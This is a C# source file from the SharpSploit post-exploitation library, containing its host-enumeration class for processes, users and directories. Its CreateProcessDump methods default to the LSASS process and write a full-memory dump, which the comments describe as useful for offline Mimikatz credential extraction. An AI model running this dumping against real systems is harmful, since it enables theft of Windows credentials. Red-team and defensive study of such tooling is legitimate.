// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.IO;
using System.Management;
using System.Diagnostics;
using System.Collections.Generic;

using SharpSploit.Generic;

namespace SharpSploit.Enumeration
{
    /// <summary>
    /// Host is a library for local host enumeration.
    /// </summary>
    public class Host
    {
        /// <summary>
        /// Gets a list of running processes on the system.
        /// </summary>
        /// <returns>List of ProcessResults.</returns>
        public static SharpSploitResultList<ProcessResult> GetProcessList()
        {
            Process[] processes = Process.GetProcesses();
            SharpSploitResultList<ProcessResult> results = new SharpSploitResultList<ProcessResult>();
            foreach (Process process in processes)
            {
                var search = new ManagementObjectSearcher("root\\CIMV2", string.Format("SELECT * FROM Win32_Process WHERE ProcessId = {0}", process.Id));
                string[] argList = new string[] { string.Empty, string.Empty };
                foreach (ManagementObject obj in search.Get())
                {
                    string processOwner;
                    int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
                    if (String.IsNullOrEmpty(argList[0]))
                    {
                        processOwner = "";
                    }
                    else
                    {
                        processOwner = argList[1] + "\\" + argList[0];
                    }
                    var parentId = Convert.ToInt32(obj["ParentProcessId"]);
                    results.Add(new ProcessResult(process.Id, Convert.ToInt32(parentId), process.ProcessName, processOwner));
                }
            }
            return results;
        }

        /// <summary>
        /// Gets whether a process is 64-bit or not.
        /// </summary>
        /// <param name="process">The process to check.</param>
        /// <returns></returns>
        public static bool Is64BitProcess(Process process)
        {
            bool retVal = false;
            bool Is64Bit = false;
            // Checking if the operating system is 64-bit
            // Are we currently in a 64-bit process?
            if (IntPtr.Size == 8)
            {
                Is64Bit = true;
            }
            // Are we currently in a 32-bit process on a 64-bit machine?
            else
            {
                // Check our current process
                Execution.DynamicInvoke.Win32.IsWow64Process(System.Diagnostics.Process.GetCurrentProcess().Handle, ref Is64Bit);
            }

            // If the OS is 64-bit
            if (Is64Bit == true)
            {
                // Check the target process
                Execution.DynamicInvoke.Win32.IsWow64Process(process.Handle, ref retVal);

                // IsWow64Process uses pass-by-reference to modify retVal with the result
                // Get that result, convert it to a bool, flip it, and return the result
                // The flipping is because of the logic in IsWow64Process. Returns true if WOW64, which is 32-bit.
                return !retVal;
            }
            // If not 64-bit operating system, the process can never be 64-bit
            else
            {
                return retVal;
            }
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="processId">Process ID of the process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static void CreateProcessDump(int processId, string outputPath = "", string outputFileName = "")
        {
            CreateProcessDump(Process.GetProcessById(processId), outputPath, outputFileName);
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="processName">Name of the process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static void CreateProcessDump(string processName = "lsass", string outputPath = "", string outputFileName = "")
        {
            if (processName.EndsWith(".exe"))
            {
                processName = processName.Substring(0, processName.Length - 4);
            }
            Process[] process_list = Process.GetProcessesByName(processName);
            if (process_list.Length > 0)
            {
                CreateProcessDump(process_list[0], outputPath, outputFileName);
            }
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="process">Process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static void CreateProcessDump(Process process, string outputPath = "", string outputFileName = "")
        {
            if (outputPath == "" || outputPath == null)
            {
                outputPath = GetCurrentDirectory();
            }
            if (outputFileName == "" || outputFileName == null)
            {
                outputFileName = process.ProcessName + "_" + process.Id + ".dmp";
            }
            
            string fullPath = Path.Combine(outputPath, outputFileName);
            FileStream fileStream = File.Create(fullPath);
            bool success = false;
            try
            {
                success = Execution.Win32.Dbghelp.MiniDumpWriteDump(process.Handle, (uint)process.Id, fileStream.SafeFileHandle, Execution.Win32.Dbghelp.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            catch (System.ComponentModel.Win32Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }

            fileStream.Close();
            if (!success)
            {
                File.Delete(fullPath);
            }
        }

        /// <summary>
        /// Gets the hostname of the system.
        /// </summary>
        /// <returns>Hostname of the system.</returns>
        public static string GetHostname()
		{
			return Environment.MachineName;
		}

        /// <summary>
        /// Gets the Domain name and username of the current logged on user.
        /// </summary>
        /// <returns>Current username.</returns>
        public static string GetUsername()
		{
			return Environment.UserDomainName + "\\" + Environment.UserName;
		}

        /// <summary>
        /// Gets the full path of the current working directory.
        /// </summary>
        /// <returns>Current working directory.</returns>
        public static string GetCurrentDirectory()
		{
			return Directory.GetCurrentDirectory();
		}

        /// <summary>
        /// Gets a directory listing of the current working directory.
        /// </summary>
        /// <returns>List of FileSystemEntryResults.</returns>
		public static SharpSploitResultList<FileSystemEntryResult> GetDirectoryListing()
		{
            return GetDirectoryListing(GetCurrentDirectory());
		}

        /// <summary>
        /// Gets a directory listing of a directory.
        /// </summary>
        /// <param name="Path">The path of the directory to get a listing of.</param>
        /// <returns>List of FileSystemEntryResults.</returns>
		public static SharpSploitResultList<FileSystemEntryResult> GetDirectoryListing(string Path)
        {
            SharpSploitResultList<FileSystemEntryResult> results = new SharpSploitResultList<FileSystemEntryResult>();
            foreach (string dir in Directory.GetDirectories(Path))
            {
                results.Add(new FileSystemEntryResult(dir));
            }
            foreach (string file in Directory.GetFiles(Path))
            {
                results.Add(new FileSystemEntryResult(file));
            }
            return results;
        }

        /// <summary>
        /// Changes the current working directory.
        /// </summary>
        /// <param name="DirectoryName">Relative or absolute path to new working directory.</param>
        public static void ChangeCurrentDirectory(string DirectoryName)
        {
            Directory.SetCurrentDirectory(DirectoryName);
        }

        /// <summary>
        /// ProcessResult represents a running process, used with the GetProcessList() function.
        /// </summary>
        public sealed class ProcessResult : SharpSploitResult
        {
            public int Pid { get; } = 0;
            public int Ppid { get; } = 0;
            public string Name { get; } = "";
            public string ProcessOnwer { get; } = "";
            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty>
                    {
                        new SharpSploitResultProperty
                        {
                            Name = "Pid",
                            Value = this.Pid
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "Ppid",
                            Value = this.Ppid
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "Name",
                            Value = this.Name
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "ProcessOnwer",
                            Value = this.ProcessOnwer
                        }
                    };
                }
            }

            public ProcessResult(int Pid = 0, int Ppid = 0, string Name = "", string ProcessOnwer = "")
            {
                this.Pid = Pid;
                this.Ppid = Ppid;
                this.Name = Name;
                this.ProcessOnwer = ProcessOnwer;
            }
        }

        /// <summary>
        /// FileSystemEntryResult represents a file on disk, used with the GetDirectoryListing() function.
        /// </summary>
        public sealed class FileSystemEntryResult : SharpSploitResult
        {
            public string Name { get; } = "";
            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty>
                    {
                        new SharpSploitResultProperty
                        {
                            Name = "Name",
                            Value = this.Name
                        }
                    };
                }
            }

            public FileSystemEntryResult(string Name = "")
            {
                this.Name = Name;
            }
        }
    }
}
